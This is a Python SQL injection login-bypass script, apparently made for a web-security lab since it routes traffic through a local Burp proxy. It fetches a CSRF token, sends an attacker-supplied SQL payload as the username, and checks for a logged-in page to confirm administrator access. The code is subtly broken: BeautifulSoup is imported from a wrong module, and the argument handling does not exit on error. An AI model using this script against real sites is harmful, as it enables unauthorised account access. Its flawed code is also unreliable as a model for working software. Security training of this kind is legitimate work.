import requests
import sys
import urllib3
from b64 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    # In this case the csrf token is inside of the "input" element and set equal to a variable named "value"
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(s, url, sqli_payload):
    csrf = get_csrf_token(s, url)
    # By capturing a POST request in Burp we identified the required data fields
    data = {"csrf": csrf,
            "username": sqli_payload,
            "password": "not-a-real-password"}
    
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    # Successful login displays a "Log out" button on the page
    if "Log out" in res:
        return True
    else: 
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except:
        print('[-] Usage: %s <URL> <SQL_PAYLOAD>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')